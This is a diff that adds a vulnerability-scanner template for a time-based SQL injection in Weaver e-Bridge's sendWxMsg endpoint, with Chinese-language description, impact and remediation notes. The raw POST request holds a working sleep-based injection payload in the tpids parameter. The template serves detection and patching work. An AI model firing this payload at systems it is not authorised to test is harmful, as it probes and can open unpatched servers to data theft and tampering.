@@ -1,0 +1,48 @@
+id: ebridge-sendwxmsg-sqli
+
+info:
+  name: Weaver e-Bridge /wxthirdapi/sendWxMsg - SQL Injection (Time-based)
+  author: qwtd
+  severity: high
+  description: |
+    泛微云桥 e-Bridge 的 /wxthirdapi/sendWxMsg 接口疑似存在 SQL 注入漏洞。
+    攻击者可通过构造 tpids 等参数注入 time-based payload（如 sleep），造成延时响应并进一步实现数据读取/篡改风险。
+  remediation: |
+    1) 升级到厂商修复版本/安全补丁（如已发布），或联系厂商获取补丁。
+    2) 临时缓解：限制 /wxthirdapi/sendWxMsg 对公网暴露（仅内网访问），并在网关/WAF 层对该路径增加 SQLi 规则拦截与速率限制。
+    3) 代码层：对 tpids/userids 等参数使用强类型校验与参数化查询（Prepared Statement），避免拼接 SQL。
+  impact: |
+    成功利用可导致未授权的数据泄露、数据篡改，严重情况下可影响业务连续性（大量延时请求导致资源耗尽）。
+  reference:
+    - https://github.com/gelusus/wxvl/blob/58f3063d432107342a58574b7747bf48357cf843/doc/2026-03/%E5%AE%98%E6%96%B9%E6%96%B0%E6%BC%8F%E6%B4%9E-%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%20e-Bridge%E7%B3%BB%E7%BB%9F%20sendWxMsg%20%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md?plain=1#L7
+  classification:
+    cwe-id: CWE-89
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  metadata:
+    vendor: weaver
+    product: e-bridge
+    verified: false
+    max-request: 1
+  tags: 泛微-云桥e-Bridge
+
+http:
+  - method: POST
+    raw:
+      - |
+        POST /wxthirdapi/sendWxMsg HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        userids=-1&tpids=1%27+or+%28select+%2A+from+%28select+sleep%285%29%29x%29+or+%27x%27%3D%27x
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"errmsg\""
